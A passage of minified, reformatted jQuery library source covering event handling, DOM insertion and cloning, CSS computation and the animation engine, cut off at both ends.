                        for (i = [], a = {}, n = 0; n < u; n++) void 0 === a[o = (r = t[n]).selector + " "] && (a[o] = r.needsContext ? -1 < w(o, this).index(l) : w.find(o, this, null, [l]).length), a[o] && i.push(r);
                        i.length && s.push({
                            elem: l,
                            handlers: i
                        })
                    } return l = this, u < t.length && s.push({
                elem: l,
                handlers: t.slice(u)
            }), s
        },
        addProp: function(e, t) {
            Object.defineProperty(w.Event.prototype, e, {
                enumerable: !0,
                configurable: !0,
                get: m(t) ? function() {
                    if (this.originalEvent) return t(this.originalEvent)
                } : function() {
                    if (this.originalEvent) return this.originalEvent[e]
                },
                set: function(t) {
                    Object.defineProperty(this, e, {
                        enumerable: !0,
                        configurable: !0,
                        writable: !0,
                        value: t
                    })
                }
            })
        },
        fix: function(e) {
            return e[w.expando] ? e : new w.Event(e)
        },
        special: {
            load: {
                noBubble: !0
            },
            click: {
                setup: function(e) {
                    var t = this || e;
                    return fe.test(t.type) && t.click && A(t, "input") && void 0 === Q.get(t, "click") && De(t, "click", ke), !1
                },
                trigger: function(e) {
                    var t = this || e;
                    return fe.test(t.type) && t.click && A(t, "input") && void 0 === Q.get(t, "click") && De(t, "click"), !0
                },
                _default: function(e) {
                    var t = e.target;
                    return fe.test(t.type) && t.click && A(t, "input") && Q.get(t, "click") || A(t, "a")
                }
            },
            beforeunload: {
                postDispatch: function(e) {
                    void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                }
            }
        }
    }, w.removeEvent = function(e, t, n) {
        e.removeEventListener && e.removeEventListener(t, n)
    }, w.Event = function(e, t) {
        if (!(this instanceof w.Event)) return new w.Event(e, t);
        e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ke : Ne, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && w.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[w.expando] = !0
    }, w.Event.prototype = {
        constructor: w.Event,
        isDefaultPrevented: Ne,
        isPropagationStopped: Ne,
        isImmediatePropagationStopped: Ne,
        isSimulated: !1,
        preventDefault: function() {
            var e = this.originalEvent;
            this.isDefaultPrevented = ke, e && !this.isSimulated && e.preventDefault()
        },
        stopPropagation: function() {
            var e = this.originalEvent;
            this.isPropagationStopped = ke, e && !this.isSimulated && e.stopPropagation()
        },
        stopImmediatePropagation: function() {
            var e = this.originalEvent;
            this.isImmediatePropagationStopped = ke, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation()
        }
    }, w.each({
        altKey: !0,
        bubbles: !0,
        cancelable: !0,
        changedTouches: !0,
        ctrlKey: !0,
        detail: !0,
        eventPhase: !0,
        metaKey: !0,
        pageX: !0,
        pageY: !0,
        shiftKey: !0,
        view: !0,
        char: !0,
        code: !0,
        charCode: !0,
        key: !0,
        keyCode: !0,
        button: !0,
        buttons: !0,
        clientX: !0,
        clientY: !0,
        offsetX: !0,
        offsetY: !0,
        pointerId: !0,
        pointerType: !0,
        screenX: !0,
        screenY: !0,
        targetTouches: !0,
        toElement: !0,
        touches: !0,
        which: function(e) {
            var t = e.button;
            return null == e.which && Ee.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && Te.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which
        }
    }, w.event.addProp), w.each({
        focus: "focusin",
        blur: "focusout"
    }, function(e, t) {
        w.event.special[e] = {
            setup: function() {
                return De(this, e, Se), !1
            },
            trigger: function() {
                return De(this, e), !0
            },
            delegateType: t
        }
    }), w.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, function(e, t) {
        w.event.special[e] = {
            delegateType: t,
            bindType: t,
            handle: function(e) {
                var n, r = e.relatedTarget,
                    o = e.handleObj;
                return r && (r === this || w.contains(this, r)) || (e.type = o.origType, n = o.handler.apply(this, arguments), e.type = t), n
            }
        }
    }), w.fn.extend({
        on: function(e, t, n, r) {
            return Ae(this, e, t, n, r)
        },
        one: function(e, t, n, r) {
            return Ae(this, e, t, n, r, 1)
        },
        off: function(e, t, n) {
            var r, o;
            if (e && e.preventDefault && e.handleObj) return r = e.handleObj, w(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this;
            if ("object" == typeof e) {
                for (o in e) this.off(o, t, e[o]);
                return this
            }
            return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = Ne), this.each(function() {
                w.event.remove(this, e, n, t)
            })
        }
    });
    var je = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
        Ie = /<script|<style|<link/i,
        Le = /checked\s*(?:[^=]|=\s*.checked.)/i,
        Be = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

    function qe(e, t) {
        return A(e, "table") && A(11 !== t.nodeType ? t : t.firstChild, "tr") && w(e).children("tbody")[0] || e
    }

    function He(e) {
        return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e
    }

    function Pe(e) {
        return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e
    }

    function Oe(e, t) {
        var n, r, o, i, a, s, u, l;
        if (1 === t.nodeType) {
            if (Q.hasData(e) && (i = Q.access(e), a = Q.set(t, i), l = i.events))
                for (o in delete a.handle, a.events = {}, l)
                    for (n = 0, r = l[o].length; n < r; n++) w.event.add(t, o, l[o][n]);
            J.hasData(e) && (s = J.access(e), u = w.extend({}, s), J.set(t, u))
        }
    }

    function Re(e, t, n, r) {
        t = a.apply([], t);
        var o, i, s, u, l, c, d = 0,
            f = e.length,
            p = f - 1,
            g = t[0],
            v = m(g);
        if (v || 1 < f && "string" == typeof g && !h.checkClone && Le.test(g)) return e.each(function(o) {
            var i = e.eq(o);
            v && (t[0] = g.call(this, o, i.html())), Re(i, t, n, r)
        });
        if (f && (i = (o = we(t, e[0].ownerDocument, !1, e, r)).firstChild, 1 === o.childNodes.length && (o = i), i || r)) {
            for (u = (s = w.map(ge(o, "script"), He)).length; d < f; d++) l = o, d !== p && (l = w.clone(l, !0, !0), u && w.merge(s, ge(l, "script"))), n.call(e[d], l, d);
            if (u)
                for (c = s[s.length - 1].ownerDocument, w.map(s, Pe), d = 0; d < u; d++) l = s[d], he.test(l.type || "") && !Q.access(l, "globalEval") && w.contains(c, l) && (l.src && "module" !== (l.type || "").toLowerCase() ? w._evalUrl && !l.noModule && w._evalUrl(l.src, {
                    nonce: l.nonce || l.getAttribute("nonce")
                }) : y(l.textContent.replace(Be, ""), l, c))
        }
        return e
    }

    function Me(e, t, n) {
        for (var r, o = t ? w.filter(t, e) : e, i = 0; null != (r = o[i]); i++) n || 1 !== r.nodeType || w.cleanData(ge(r)), r.parentNode && (n && ie(r) && ve(ge(r, "script")), r.parentNode.removeChild(r));
        return e
    }
    w.extend({
        htmlPrefilter: function(e) {
            return e.replace(je, "<$1></$2>")
        },
        clone: function(e, t, n) {
            var r, o, i, a, s, u, l, c = e.cloneNode(!0),
                d = ie(e);
            if (!(h.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || w.isXMLDoc(e)))
                for (a = ge(c), r = 0, o = (i = ge(e)).length; r < o; r++) s = i[r], "input" === (l = (u = a[r]).nodeName.toLowerCase()) && fe.test(s.type) ? u.checked = s.checked : "input" !== l && "textarea" !== l || (u.defaultValue = s.defaultValue);
            if (t)
                if (n)
                    for (i = i || ge(e), a = a || ge(c), r = 0, o = i.length; r < o; r++) Oe(i[r], a[r]);
                else Oe(e, c);
            return 0 < (a = ge(c, "script")).length && ve(a, !d && ge(e, "script")), c
        },
        cleanData: function(e) {
            for (var t, n, r, o = w.event.special, i = 0; void 0 !== (n = e[i]); i++)
                if (Y(n)) {
                    if (t = n[Q.expando]) {
                        if (t.events)
                            for (r in t.events) o[r] ? w.event.remove(n, r) : w.removeEvent(n, r, t.handle);
                        n[Q.expando] = void 0
                    }
                    n[J.expando] && (n[J.expando] = void 0)
                }
        }
    }), w.fn.extend({
        detach: function(e) {
            return Me(this, e, !0)
        },
        remove: function(e) {
            return Me(this, e)
        },
        text: function(e) {
            return _(this, function(e) {
                return void 0 === e ? w.text(this) : this.empty().each(function() {
                    1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e)
                })
            }, null, e, arguments.length)
        },
        append: function() {
            return Re(this, arguments, function(e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || qe(this, e).appendChild(e)
            })
        },
        prepend: function() {
            return Re(this, arguments, function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = qe(this, e);
                    t.insertBefore(e, t.firstChild)
                }
            })
        },
        before: function() {
            return Re(this, arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            })
        },
        after: function() {
            return Re(this, arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            })
        },
        empty: function() {
            for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (w.cleanData(ge(e, !1)), e.textContent = "");
            return this
        },
        clone: function(e, t) {
            return e = null != e && e, t = null == t ? e : t, this.map(function() {
                return w.clone(this, e, t)
            })
        },
        html: function(e) {
            return _(this, function(e) {
                var t = this[0] || {},
                    n = 0,
                    r = this.length;
                if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                if ("string" == typeof e && !Ie.test(e) && !me[(pe.exec(e) || ["", ""])[1].toLowerCase()]) {
                    e = w.htmlPrefilter(e);
                    try {
                        for (; n < r; n++) 1 === (t = this[n] || {}).nodeType && (w.cleanData(ge(t, !1)), t.innerHTML = e);
                        t = 0
                    } catch (e) {}
                }
                t && this.empty().append(e)
            }, null, e, arguments.length)
        },
        replaceWith: function() {
            var e = [];
            return Re(this, arguments, function(t) {
                var n = this.parentNode;
                w.inArray(this, e) < 0 && (w.cleanData(ge(this)), n && n.replaceChild(t, this))
            }, e)
        }
    }), w.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(e, t) {
        w.fn[e] = function(e) {
            for (var n, r = [], o = w(e), i = o.length - 1, a = 0; a <= i; a++) n = a === i ? this : this.clone(!0), w(o[a])[t](n), s.apply(r, n.get());
            return this.pushStack(r)
        }
    });
    var Fe = new RegExp("^(" + te + ")(?!px)[a-z%]+$", "i"),
        We = function(t) {
            var n = t.ownerDocument.defaultView;
            return n && n.opener || (n = e), n.getComputedStyle(t)
        },
        $e = new RegExp(re.join("|"), "i");

    function _e(e, t, n) {
        var r, o, i, a, s = e.style;
        return (n = n || We(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || ie(e) || (a = w.style(e, t)), !h.pixelBoxStyles() && Fe.test(a) && $e.test(t) && (r = s.width, o = s.minWidth, i = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = r, s.minWidth = o, s.maxWidth = i)), void 0 !== a ? a + "" : a
    }

    function Ue(e, t) {
        return {
            get: function() {
                if (!e()) return (this.get = t).apply(this, arguments);
                delete this.get
            }
        }
    }! function() {
        function t() {
            if (c) {
                l.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", c.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", oe.appendChild(l).appendChild(c);
                var t = e.getComputedStyle(c);
                o = "1%" !== t.top, u = 12 === n(t.marginLeft), c.style.right = "60%", s = 36 === n(t.right), i = 36 === n(t.width), c.style.position = "absolute", a = 12 === n(c.offsetWidth / 3), oe.removeChild(l), c = null
            }
        }

        function n(e) {
            return Math.round(parseFloat(e))
        }
        var o, i, a, s, u, l = r.createElement("div"),
            c = r.createElement("div");
        c.style && (c.style.backgroundClip = "content-box", c.cloneNode(!0).style.backgroundClip = "", h.clearCloneStyle = "content-box" === c.style.backgroundClip, w.extend(h, {
            boxSizingReliable: function() {
                return t(), i
            },
            pixelBoxStyles: function() {
                return t(), s
            },
            pixelPosition: function() {
                return t(), o
            },
            reliableMarginLeft: function() {
                return t(), u
            },
            scrollboxSize: function() {
                return t(), a
            }
        }))
    }();
    var ze = ["Webkit", "Moz", "ms"],
        Xe = r.createElement("div").style,
        Ve = {};

    function Ye(e) {
        return w.cssProps[e] || Ve[e] || (e in Xe ? e : Ve[e] = function(e) {
            for (var t = e[0].toUpperCase() + e.slice(1), n = ze.length; n--;)
                if ((e = ze[n] + t) in Xe) return e
        }(e) || e)
    }
    var Ge = /^(none|table(?!-c[ea]).+)/,
        Qe = /^--/,
        Je = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        Ke = {
            letterSpacing: "0",
            fontWeight: "400"
        };

    function Ze(e, t, n) {
        var r = ne.exec(t);
        return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t
    }

    function et(e, t, n, r, o, i) {
        var a = "width" === t ? 1 : 0,
            s = 0,
            u = 0;
        if (n === (r ? "border" : "content")) return 0;
        for (; a < 4; a += 2) "margin" === n && (u += w.css(e, n + re[a], !0, o)), r ? ("content" === n && (u -= w.css(e, "padding" + re[a], !0, o)), "margin" !== n && (u -= w.css(e, "border" + re[a] + "Width", !0, o))) : (u += w.css(e, "padding" + re[a], !0, o), "padding" !== n ? u += w.css(e, "border" + re[a] + "Width", !0, o) : s += w.css(e, "border" + re[a] + "Width", !0, o));
        return !r && 0 <= i && (u += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - i - u - s - .5)) || 0), u
    }

    function tt(e, t, n) {
        var r = We(e),
            o = (!h.boxSizingReliable() || n) && "border-box" === w.css(e, "boxSizing", !1, r),
            i = o,
            a = _e(e, t, r),
            s = "offset" + t[0].toUpperCase() + t.slice(1);
        if (Fe.test(a)) {
            if (!n) return a;
            a = "auto"
        }
        return (!h.boxSizingReliable() && o || "auto" === a || !parseFloat(a) && "inline" === w.css(e, "display", !1, r)) && e.getClientRects().length && (o = "border-box" === w.css(e, "boxSizing", !1, r), (i = s in e) && (a = e[s])), (a = parseFloat(a) || 0) + et(e, t, n || (o ? "border" : "content"), i, r, a) + "px"
    }

    function nt(e, t, n, r, o) {
        return new nt.prototype.init(e, t, n, r, o)
    }
    w.extend({
        cssHooks: {
            opacity: {
                get: function(e, t) {
                    if (t) {
                        var n = _e(e, "opacity");
                        return "" === n ? "1" : n
                    }
                }
            }
        },
        cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            gridArea: !0,
            gridColumn: !0,
            gridColumnEnd: !0,
            gridColumnStart: !0,
            gridRow: !0,
            gridRowEnd: !0,
            gridRowStart: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {},
        style: function(e, t, n, r) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var o, i, a, s = V(t),
                    u = Qe.test(t),
                    l = e.style;
                if (u || (t = Ye(s)), a = w.cssHooks[t] || w.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (o = a.get(e, !1, r)) ? o : l[t];
                "string" == (i = typeof n) && (o = ne.exec(n)) && o[1] && (n = le(e, t, o), i = "number"), null != n && n == n && ("number" !== i || u || (n += o && o[3] || (w.cssNumber[s] ? "" : "px")), h.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (u ? l.setProperty(t, n) : l[t] = n))
            }
        },
        css: function(e, t, n, r) {
            var o, i, a, s = V(t);
            return Qe.test(t) || (t = Ye(s)), (a = w.cssHooks[t] || w.cssHooks[s]) && "get" in a && (o = a.get(e, !0, n)), void 0 === o && (o = _e(e, t, r)), "normal" === o && t in Ke && (o = Ke[t]), "" === n || n ? (i = parseFloat(o), !0 === n || isFinite(i) ? i || 0 : o) : o
        }
    }), w.each(["height", "width"], function(e, t) {
        w.cssHooks[t] = {
            get: function(e, n, r) {
                if (n) return !Ge.test(w.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? tt(e, t, r) : ue(e, Je, function() {
                    return tt(e, t, r)
                })
            },
            set: function(e, n, r) {
                var o, i = We(e),
                    a = !h.scrollboxSize() && "absolute" === i.position,
                    s = (a || r) && "border-box" === w.css(e, "boxSizing", !1, i),
                    u = r ? et(e, t, r, s, i) : 0;
                return s && a && (u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(i[t]) - et(e, t, "border", !1, i) - .5)), u && (o = ne.exec(n)) && "px" !== (o[3] || "px") && (e.style[t] = n, n = w.css(e, t)), Ze(0, n, u)
            }
        }
    }), w.cssHooks.marginLeft = Ue(h.reliableMarginLeft, function(e, t) {
        if (t) return (parseFloat(_e(e, "marginLeft")) || e.getBoundingClientRect().left - ue(e, {
            marginLeft: 0
        }, function() {
            return e.getBoundingClientRect().left
        })) + "px"
    }), w.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(e, t) {
        w.cssHooks[e + t] = {
            expand: function(n) {
                for (var r = 0, o = {}, i = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++) o[e + re[r] + t] = i[r] || i[r - 2] || i[0];
                return o
            }
        }, "margin" !== e && (w.cssHooks[e + t].set = Ze)
    }), w.fn.extend({
        css: function(e, t) {
            return _(this, function(e, t, n) {
                var r, o, i = {},
                    a = 0;
                if (Array.isArray(t)) {
                    for (r = We(e), o = t.length; a < o; a++) i[t[a]] = w.css(e, t[a], !1, r);
                    return i
                }
                return void 0 !== n ? w.style(e, t, n) : w.css(e, t)
            }, e, t, 1 < arguments.length)
        }
    }), ((w.Tween = nt).prototype = {
        constructor: nt,
        init: function(e, t, n, r, o, i) {
            this.elem = e, this.prop = n, this.easing = o || w.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = i || (w.cssNumber[n] ? "" : "px")
        },
        cur: function() {
            var e = nt.propHooks[this.prop];
            return e && e.get ? e.get(this) : nt.propHooks._default.get(this)
        },
        run: function(e) {
            var t, n = nt.propHooks[this.prop];
            return this.options.duration ? this.pos = t = w.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : nt.propHooks._default.set(this), this
        }
    }).init.prototype = nt.prototype, (nt.propHooks = {
        _default: {
            get: function(e) {
                var t;
                return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = w.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0
            },
            set: function(e) {
                w.fx.step[e.prop] ? w.fx.step[e.prop](e) : 1 !== e.elem.nodeType || !w.cssHooks[e.prop] && null == e.elem.style[Ye(e.prop)] ? e.elem[e.prop] = e.now : w.style(e.elem, e.prop, e.now + e.unit)
            }
        }
    }).scrollTop = nt.propHooks.scrollLeft = {
        set: function(e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    }, w.easing = {
        linear: function(e) {
            return e
        },
        swing: function(e) {
            return .5 - Math.cos(e * Math.PI) / 2
        },
        _default: "swing"
    }, w.fx = nt.prototype.init, w.fx.step = {};
    var rt, ot, it, at, st = /^(?:toggle|show|hide)$/,
        ut = /queueHooks$/;

    function lt() {
        ot && (!1 === r.hidden && e.requestAnimationFrame ? e.requestAnimationFrame(lt) : e.setTimeout(lt, w.fx.interval), w.fx.tick())
    }

    function ct() {
        return e.setTimeout(function() {
            rt = void 0
        }), rt = Date.now()
    }

    function dt(e, t) {
        var n, r = 0,
            o = {
                height: e
            };
        for (t = t ? 1 : 0; r < 4; r += 2 - t) o["margin" + (n = re[r])] = o["padding" + n] = e;
        return t && (o.opacity = o.width = e), o
    }

    function ft(e, t, n) {
        for (var r, o = (pt.tweeners[t] || []).concat(pt.tweeners["*"]), i = 0, a = o.length; i < a; i++)
            if (r = o[i].call(n, t, e)) return r
    }

    function pt(e, t, n) {
        var r, o, i = 0,
            a = pt.prefilters.length,
            s = w.Deferred().always(function() {
                delete u.elem
            }),
            u = function() {
                if (o) return !1;
                for (var t = rt || ct(), n = Math.max(0, l.startTime + l.duration - t), r = 1 - (n / l.duration || 0), i = 0, a = l.tweens.length; i < a; i++) l.tweens[i].run(r);
                return s.notifyWith(e, [l, r, n]), r < 1 && a ? n : (a || s.notifyWith(e, [l, 1, 0]), s.resolveWith(e, [l]), !1)
            },
            l = s.promise({
                elem: e,
                props: w.extend({}, t),
                opts: w.extend(!0, {
                    specialEasing: {},
                    easing: w.easing._default
                }, n),
                originalProperties: t,
                originalOptions: n,
                startTime: rt || ct(),
                duration: n.duration,
                tweens: [],
                createTween: function(t, n) {
                    var r = w.Tween(e, l.opts, t, n, l.opts.specialEasing[t] || l.opts.easing);
                    return l.tweens.push(r), r
                },
                stop: function(t) {
                    var n = 0,
                        r = t ? l.tweens.length : 0;
                    if (o) return this;
                    for (o = !0; n < r; n++) l.tweens[n].run(1);
                    return t ? (s.notifyWith(e, [l, 1, 0]), s.resolveWith(e, [l, t])) : s.rejectWith(e, [l, t]), this
                }
            }),
            c = l.props;
        for (function(e, t) {
                var n, r, o, i, a;
                for (n in e)
                    if (o = t[r = V(n)], i = e[n], Array.isArray(i) && (o = i[1], i = e[n] = i[0]), n !== r && (e[r] = i, delete e[n]), (a = w.cssHooks[r]) && "expand" in a)
                        for (n in i = a.expand(i), delete e[r], i) n in e || (e[n] = i[n], t[n] = o);
                    else t[r] = o
            }(c, l.opts.specialEasing); i < a; i++)
            if (r = pt.prefilters[i].call(l, e, c, l.opts)) return m(r.stop) && (w._queueHooks(l.elem, l.opts.queue).stop = r.stop.bind(r)), r;
        return w.map(c, ft, l), m(l.opts.start) && l.opts.start.call(e, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), w.fx.timer(w.extend(u, {
            elem: e,
            anim: l,
            queue: l.opts.queue
        })), l
    }
    w.Animation = w.extend(pt, {
        tweeners: {
            "*": [function(e, t) {
                var n = this.createTween(e, t);
                return le(n.elem, e, ne.exec(t), n), n
            }]
        },
        tweener: function(e, t) {
            m(e) ? (t = e, e = ["*"]) : e = e.match(P);
            for (var n, r = 0, o = e.length; r < o; r++) n = e[r], pt.tweeners[n] = pt.tweeners[n] || [], pt.tweeners[n].unshift(t)
        },
        prefilters: [function(e, t, n) {
            var r, o, i, a, s, u, l, c, d = "width" in t || "height" in t,
                f = this,
                p = {},
                h = e.style,
                m = e.nodeType && se(e),
                g = Q.get(e, "fxshow");
            for (r in n.queue || (null == (a = w._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, s = a.empty.fire, a.empty.fire = function() {
                    a.unqueued || s()
                }), a.unqueued++, f.always(function() {
                    f.always(function() {
                        a.unqueued--, w.queue(e, "fx").length || a.empty.fire()
                    })
                })), t)
                if (o = t[r], st.test(o)) {
                    if (delete t[r], i = i || "toggle" === o, o === (m ? "hide" : "show")) {
                        if ("show" !== o || !g || void 0 === g[r]) continue;
                        m = !0
                    }
                    p[r] = g && g[r] || w.style(e, r)
                } if ((u = !w.isEmptyObject(t)) || !w.isEmptyObject(p))
                for (r in d && 1 === e.nodeType && (n.overflow = [h.overflow, h.overflowX, h.overflowY], null == (l = g && g.display) && (l = Q.get(e, "display")), "none" === (c = w.css(e, "display")) && (l ? c = l : (de([e], !0), l = e.style.display || l, c = w.css(e, "display"), de([e]))), ("inline" === c || "inline-block" === c && null != l) && "none" === w.css(e, "float") && (u || (f.done(function() {
                        h.display = l
                    }), null == l && (c = h.display, l = "none" === c ? "" : c)), h.display = "inline-block")), n.overflow && (h.overflow = "hidden", f.always(function() {
                        h.overflow = n.overflow[0], h.overflowX = n.overflow[1], h.overflowY = n.overflow[2]
                    })), u = !1, p) u || (g ? "hidden" in g && (m = g.hidden) : g = Q.access(e, "fxshow", {
                    display: l
                }), i && (g.hidden = !m), m && de([e], !0), f.done(function() {
                    for (r in m || de([e]), Q.remove(e, "fxshow"), p) w.style(e, r, p[r])
                })), u = ft(m ? g[r] : 0, r, f), r in g || (g[r] = u.start, m && (u.end = u.start, u.start = 0))
        }],
        prefilter: function(e, t) {
            t ? pt.prefilters.unshift(e) : pt.prefilters.push(e)
        }
    }), w.speed = function(e, t, n) {
        var r = e && "object" == typeof e ? w.extend({}, e) : {
            complete: n || !n && t || m(e) && e,
            duration: e,
            easing: n && t || t && !m(t) && t
        };
        return w.fx.off ? r.duration = 0 : "number" != typeof r.duration && (r.duration in w.fx.speeds ? r.duration = w.fx.speeds[r.duration] : r.duration = w.fx.speeds._default), null != r.queue && !0 !== r.queue || (r.queue = "fx"), r.old = r.complete, r.complete = function() {
            m(r.old) && r.old.call(this), r.queue && w.dequeue(this, r.queue)
        }, r
    }, w.fn.extend({
        fadeTo: function(e, t, n, r) {
            return this.filter(se).css("opacity", 0).show().end().animate({
                opacity: t
            }, e, n, r)
        },
        animate: function(e, t, n, r) {
            var o = w.isEmptyObject(e),
                i = w.speed(t, n, r),
                a = function() {
                    var t = pt(this, w.extend({}, e), i);
                    (o || Q.get(this, "finish")) && t.stop(!0)
                };
            return a.finish = a, o || !1 === i.queue ? this.each(a) : this.queue(i.queue, a)
        },
        stop: function(e, t, n) {
            var r = function(e) {
                var t = e.stop;
                delete e.stop, t(n)
            };
            return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each(function() {
                var t = !0,
                    o = null != e && e + "queueHooks",
                    i = w.timers,
                    a = Q.get(this);
                if (o) a[o] && a[o].stop && r(a[o]);
                else
                    for (o in a) a[o] && a[o].stop && ut.test(o) && r(a[o]);
                for (o = i.length; o--;) i[o].elem !== this || null != e && i[o].queue !== e || (i[o].anim.stop(n), t = !1, i.splice(o, 1));
                !t && n || w.dequeue(this, e)
            })
        },
        finish: function(e) {
            return !1 !== e && (e = e || "fx"), this.each(function() {
                var t, n = Q.get(this),
                    r = n[e + "queue"],
                    o = n[e + "queueHooks"],
                    i = w.timers,
                    a = r ? r.length : 0;
                for (n.finish = !0, w.queue(this, e, []), o && o.stop && o.stop.call(this, !0), t = i.length; t--;) i[t].elem === this && i[t].queue === e && (i[t].anim.stop(!0), i.splice(t, 1));
                for (t = 0; t < a; t++) r[t] && r[t].finish && r[t].finish.call(this);
                delete n.finish
            })
        }
    }), w.each(["toggle", "show", "hide"], function(e, t) {
        var n = w.fn[t];
        w.fn[t] = function(e, r, o) {
            return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(dt(t, !0), e, r, o)
        }
    }), w.each({
        slideDown: dt("show"),
        slideUp: dt("hide"),
        slideToggle: dt("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(e, t) {
        w.fn[e] = function(e, n, r) {
            return this.animate(t, e, n, r)
        }
    }), w.timers = [], w.fx.tick = function() {
        var e, t = 0,
            n = w.timers;
        for (rt = Date.now(); t < n.length; t++)(e = n[t])() || n[t] !== e || n.splice(t--, 1);
        n.length || w.fx.stop(), rt = void 0
    }, w.fx.timer = function(e) {
        w.timers.push(e), w.fx.start()
    }, w.fx.interval = 13, w.fx.start = function() {
        ot || (ot = !0, lt())
    }, w.fx.stop = function() {
        ot = null
    }, w.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    }, w.fn.delay = function(t, n) {
        return t = w.fx && w.fx.speeds[t] || t, n = n || "fx", this.queue(n, function(n, r) {
            var o = e.setTimeout(n, t);
            r.stop = function() {
                e.clearTimeout(o)
            }
        })
    }, it = r.createElement("input"), at = r.createElement("select").appendChild(r.createElement("option")), it.type = "checkbox", h.checkOn = "" !== it.value, h.optSelected = at.selected, (it = r.createElement("input")).value = "t", it.type = "radio", h.radioValue = "t" === it.value;
    var ht, mt = w.expr.attrHandle;
    w.fn.extend({
        attr: function(e, t) {
            return _(this, w.attr, e, t, 1 < arguments.length)
        },
        removeAttr: function(e) {
            return this.each(function() {
                w.removeAttr(this, e)
            })
        }
    }), w.extend({
        attr: function(e, t, n) {
            var r, o, i = e.nodeType;
            if (3 !== i && 8 !== i && 2 !== i) return void 0 === e.getAttribute ? w.prop(e, t, n) : (1 === i && w.isXMLDoc(e) || (o = w.attrHooks[t.toLowerCase()] || (w.expr.match.bool.test(t) ? ht : void 0)), void 0 !== n ? null === n ? void w.removeAttr(e, t) : o && "set" in o && void 0 !== (r = o.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : o && "get" in o && null !== (r = o.get(e, t)) ? r : null == (r = w.find.attr(e, t)) ? void 0 : r)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
                    if (!h.radioValue && "radio" === t && A(e, "input")) {
                        var n = e.value;
                        return e.setAttribute("type", t), n && (e.value = n), t
                    }
                }
            }
        },
        removeAttr: function(e, t) {
            var n, r = 0,
                o = t && t.match(P);
            if (o && 1 === e.nodeType)
                for (; n = o[r++];) e.removeAttribute(n)
        }
    }), ht = {
        set: function(e, t, n) {
            return !1 === t ? w.removeAttr(e, n) : e.setAttribute(n, n), n
        }
    }, w.each(w.expr.match.bool.source.match(/\w+/g), function(e, t) {
        var n = mt[t] || w.find.attr;
        mt[t] = function(e, t, r) {
            var o, i, a = t.toLowerCase();
